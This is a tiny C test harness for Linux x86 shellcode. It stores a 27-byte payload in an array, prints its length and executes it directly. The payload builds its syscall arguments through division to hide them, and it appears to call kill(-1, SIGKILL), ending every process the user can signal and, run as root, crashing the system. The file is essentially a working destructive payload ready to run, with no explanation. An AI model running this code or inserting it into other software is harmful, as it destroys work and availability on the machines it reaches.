/*
 * Put your assembler file here
 */

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x66\xb8\x80\x04\xb2\x80\xf6\xf2\x89\xc1\x66\xb8\xe6\x0f\xb2\x6e\xf6\xf2\x4b\xcd\x80";

		       
int main(int argc, char **argv)
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

	
